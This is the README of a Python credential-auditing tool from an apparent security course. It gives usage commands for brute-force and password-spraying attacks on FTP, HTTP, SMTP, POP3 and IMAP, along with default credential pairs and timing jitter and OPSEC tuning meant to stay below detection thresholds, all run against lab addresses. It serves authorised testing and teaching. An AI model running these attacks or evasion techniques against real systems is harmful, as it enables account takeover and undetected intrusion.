# Project 06 — Network Service Credential Auditor

> Multi-protocol credential auditing framework — FTP · HTTP Basic · HTTP Form · SMTP · POP3 · IMAP — built entirely on the Python standard library with adaptive rate-limiting, per-service lockout detection, and MITRE ATT&CK–tagged JSON reporting.

---

## What makes this different

| Concern | Naive approach | This tool |
|---|---|---|
| **Protocol support** | Single service, one loop | Six protocol plugins via typed ABC — FTP, HTTP Basic, HTTP Form, SMTP, POP3, IMAP |
| **Lockout awareness** | Blindly fires until banned | Sliding-window failure tracker; backs off on `WARNING`, stops on `LOCKED` |
| **Rate control** | `time.sleep(1)` flat | Gaussian jitter on top of configurable base delay — mimics human cadence |
| **Credential ordering** | Wordlist order as-is | Priority queue: 16 default combos first, then wordlist sorted by password complexity weight |
| **HTTP Form auth** | Hope a 200 means success | Cookie jar + redirect tracking + regex pattern matching on response body |
| **SMTP** | Try LOGIN only | Reads EHLO capabilities, attempts STARTTLS upgrade, supports LOGIN/PLAIN/CRAM-MD5 |
| **Password spraying** | Not supported | `--spray` mode iterates passwords outer-loop to avoid per-account lockout |
| **Output** | Print to stdout | Live progress + structured JSON report with OPSEC risk scoring |
| **Dependencies** | Often requires requests, paramiko, impacket | **Zero pip installs** — 100% Python stdlib |

---

## Architecture

```
credaudit.py
├── Protocol plugins (ABC)
│   ├── FTPAuditor          — ftplib.FTP / FTP_TLS
│   ├── HTTPBasicAuditor    — urllib.request + HTTPBasicAuthHandler
│   ├── HTTPFormAuditor     — urllib.request POST + CookieJar + redirect tracking
│   ├── SMTPAuditor         — smtplib.SMTP / SMTP_SSL + STARTTLS
│   ├── POP3Auditor         — poplib.POP3 / POP3_SSL
│   └── IMAPAuditor         — imaplib.IMAP4 / IMAP4_SSL
│
├── LockoutDetector         — sliding-window failure state machine (CLEAN/WARNING/LOCKED)
├── RateLimiter             — Gaussian jitter + exponential backoff
├── WordlistLoader          — cartesian product · combo files · spray mode · priority ordering
├── AuditEngine             — thread pool, queue-based dispatch, shared lockout/rate state
└── AuditReport             — structured JSON output + OPSEC risk scoring + MITRE ATT&CK tags
```

---

## Requirements

```
Python 3.9+   (standard library only — no pip install needed)
```

---

## Usage

### FTP — default credentials sweep

```bash
python3 credaudit.py \
  --host 192.168.100.20 \
  --port 21 \
  --protocol ftp
```

> Uses the built-in priority list of 16 default/common credential pairs.
> Tries `anonymous:`, `admin:admin`, `root:root`, `ftp:ftp`, etc.

---

### HTTP Basic Auth — custom wordlist

```bash
python3 credaudit.py \
  --host 192.168.100.30 \
  --port 80 \
  --protocol http-basic \
  --login-url /admin/ \
  --usernames admin,root,webmaster \
  --passwords admin,password,123456,admin123,letmein \
  --workers 2 \
  --delay 1.0 \
  --verbose
```

---

### HTTP Form — login page with response patterns

```bash
python3 credaudit.py \
  --host 192.168.100.30 \
  --port 8080 \
  --protocol http-form \
  --login-url /login \
  --username-field username \
  --password-field password \
  --success-pattern "Welcome|Dashboard" \
  --failure-pattern "Invalid credentials|Login failed" \
  --combo-file rockyou_top1000.txt \
  --workers 2 \
  --delay 2.0 \
  --json http_results.json
```

---

### SMTP AUTH — with STARTTLS

```bash
python3 credaudit.py \
  --host 192.168.100.50 \
  --port 587 \
  --protocol smtp \
  --smtp-domain lab.local \
  --usernames alice,bob,charlie \
  --passwords password,Summer2024!,Company123 \
  --delay 3.0
```

---

### POP3 over SSL

```bash
python3 credaudit.py \
  --host mail.lab.local \
  --port 995 \
  --protocol pop3 \
  --tls \
  --combo-file combos.txt \
  --delay 1.5 \
  --stop-on-success
```

---

### IMAP — combo file

```bash
python3 credaudit.py \
  --host 192.168.100.60 \
  --port 143 \
  --protocol imap \
  --combo-file users_passwords.txt \
  --workers 3 \
  --delay 1.0 \
  --verbose \
  --json imap_audit.json
```

---

### Password spraying — evade per-account lockout

```bash
python3 credaudit.py \
  --host 192.168.100.20 \
  --port 21 \
  --protocol ftp \
  --usernames alice,bob,charlie,dave,eve \
  --passwords Summer2024! \
  --spray \
  --delay 5.0 \
  --json spray_results.json
```

> In spray mode the outer loop is **passwords**, not users.  Each account sees at most one attempt per password, making it much harder for per-account lockout policies to trigger.

---

### Single credential verification

```bash
python3 credaudit.py \
  --host 192.168.100.20 \
  --port 21 \
  --protocol ftp \
  --cred "admin:password123" \
  --stop-on-success
```

---

## Sample output

```
╔══════════════════════════════════════════════════════════════════╗
║      Network Service Credential Auditor  ·  Project 06          ║
║      Applied AI Security Projects  ·  Module 01 · Week 01       ║
╚══════════════════════════════════════════════════════════════════╝

  Target:    ftp://192.168.100.20:21
  Mode:      brute-force
  Creds:     22
  Workers:   2
  Delay:     0.5s ± 0.2s jitter

  [!] Authorised use only.  Ensure you have written permission.
  [!] MITRE T1110 activity — check your rules of engagement.

▶ ftp://192.168.100.20:21  22 credentials · 2 workers · delay=0.5s

  ✗ [14:02:11] anonymous:      48ms
  ✗ [14:02:12] admin:admin    51ms
  ✓ [14:02:13] admin:password    54ms  Login accepted

  Summary  ftp://192.168.100.20:21
  Attempts:          3
  Successes:         1
  Failures:          2
  Errors:            0
  Lockout events:    0
  Elapsed:           2.3s
  OPSEC risk:        LOW

  Found credentials:
    ✓ admin:password

  OPSEC notes:
    · Rate 1.30 req/s — almost certainly triggers IDS/SIEM alerts
    · MITRE T1110.001 (Password Guessing) — log source: auth logs, failed login events

────────────────────────────────────────────────────────────────────────
  AUDIT REPORT
────────────────────────────────────────────────────────────────────────
  Scan ID   : credaudit-1711987331
  Started   : 2024-04-01T14:02:10+00:00
  Finished  : 2024-04-01T14:02:13+00:00
  Services  : 1
  Creds found: 1

  ftp://192.168.100.20:21  →  COMPROMISED
      ✓ admin:password

  MITRE ATT&CK
    T1110    Brute Force
    T1110.001  Password Guessing
    T1110.003  Password Spraying
    T1078    Valid Accounts
────────────────────────────────────────────────────────────────────────

  ✓ JSON report saved → results.json
```

---

## JSON report structure

```json
{
  "scan_id": "credaudit-1711987331",
  "started_at": "2024-04-01T14:02:10+00:00",
  "finished_at": "2024-04-01T14:02:13+00:00",
  "mitre_attack": [
    { "id": "T1110",     "name": "Brute Force",         "url": "..." },
    { "id": "T1110.001", "name": "Password Guessing",   "url": "..." },
    { "id": "T1110.003", "name": "Password Spraying",   "url": "..." },
    { "id": "T1078",     "name": "Valid Accounts",      "url": "..." }
  ],
  "total_credentials_found": 1,
  "services": [
    {
      "target": { "host": "192.168.100.20", "port": 21, "protocol": "ftp", ... },
      "summary": {
        "total_attempts": 3,
        "successes": 1,
        "failures": 2,
        "errors": 0,
        "lockout_events": 0,
        "opsec_risk": "LOW"
      },
      "found_credentials": ["admin:password"],
      "attempts": [
        { "username": "admin", "password": "password", "status": "success",
          "latency_ms": 54.2, "detail": "Login accepted" }
      ]
    }
  ]
}
```

---

## OPSEC risk scoring

The engine measures request rate (attempts/second) and lockout events and
assigns a four-level risk score reported at the end of each service audit.

| Risk | Condition |
|---|---|
| `CRITICAL` | Rate > 1 req/s **or** lockout events detected |
| `HIGH` | Rate 0.5–1 req/s |
| `MEDIUM` | Rate 0.1–0.5 req/s or no delay configured |
| `LOW` | Rate < 0.1 req/s, no lockout signal |

This mirrors the thresholds used by common SIEM correlation rules (e.g., Splunk
ES `Access - Brute Force Access Behavior Detected`) and helps operators tune
`--delay` to stay below detection thresholds during authorised assessments.

---

## Lockout detection state machine

```
          first attempt
               │
           CLEAN ──── consecutive failures ≥ 5 ────► WARNING
               │                                        │
               │                              rate limiter doubles delay
               │                                        │
               └──────────── failures in window ≥ 10 ──► LOCKED
                             OR fast-fail (<50 ms) × 3      │
                                                         queue drained
                                                         engine stops
```

When `LOCKED` is reached, remaining credentials in the queue are marked
`skipped` rather than attempted, preventing further account lockout damage.

---

## Key design decisions

1. **ABC plugin pattern, not if/elif.**  Each protocol is a self-contained
   `ProtocolAuditor` subclass.  Adding a new protocol (e.g., SSH with
   `paramiko`) requires only a new class and one line in `_AUDITOR_MAP` — the
   engine, lockout detector, and rate limiter require zero changes.

2. **Per-attempt connections, never shared state.**  Every `try_credential()`
   call opens and closes its own connection.  This is slower than connection
   pooling but eliminates cross-thread state contamination and accurately
   reflects how authentication attempts appear in server logs.

3. **Two lockout signals, not one.**  Consecutive-failure count catches quota
   policies; fast-fail latency detection catches services that have started
   returning instant `Connection refused` (IP block at firewall level).  Either
   signal alone is insufficient.

4. **Gaussian jitter, not uniform random.**  `random.gauss(0, σ)` produces
   delays that cluster around the mean with rare outliers — statistically
   closer to human login patterns than `random.uniform(a, b)`, which creates a
   flat distribution that is still detectable by ML-based anomaly detectors.

5. **Priority credentials are not configurable.**  The 16 built-in default
   pairs (`admin:admin`, `anonymous:`, `pi:raspberry`, etc.) are always tried
   first because they represent real-world default credentials that have been
   found in live environments.  Keeping them non-optional ensures they are
   never accidentally omitted from a combo file.

---

## Integration with other tools in this series

| Tool | How to chain |
|---|---|
| Project 01 — Port Scanner | Run first to find open ports, then target open FTP/SMTP/IMAP ports |
| Project 03 — Banner Grabber | Identify service versions → prioritise credentials for that version |
| Project 05 — Shell Payload Generator | Once credentials are confirmed, use to generate post-auth payloads |

Example pipeline:
```bash
# 1. Scan for open service ports
python3 portscanner.py --target 192.168.100.0/24 --ports ftp,smtp,imap --json ports.json

# 2. Grab banners to identify versions
python3 bannergrab.py --input ports.json --json banners.json

# 3. Audit credentials against discovered services
python3 credaudit.py --host 192.168.100.20 --port 21 --protocol ftp --json creds.json
```

---

## Lab environment

```
Host OS    : macOS M4 (darwin 25.x)
Hypervisor : VMware Fusion
Network    : 192.168.100.0/24 (host-only)
Targets    : Kali Linux guest, Metasploitable2, custom Ubuntu webserver
```

---

## Legal notice

This tool is intended for **authorised security assessments, CTF competitions,
and lab environments only**.  Running credential audits against systems you do
not own or do not have written permission to test is illegal under the Computer
Fraud and Abuse Act (CFAA), the UK Computer Misuse Act, and equivalent laws in
most jurisdictions.

MITRE ATT&CK® is a registered trademark of The MITRE Corporation.
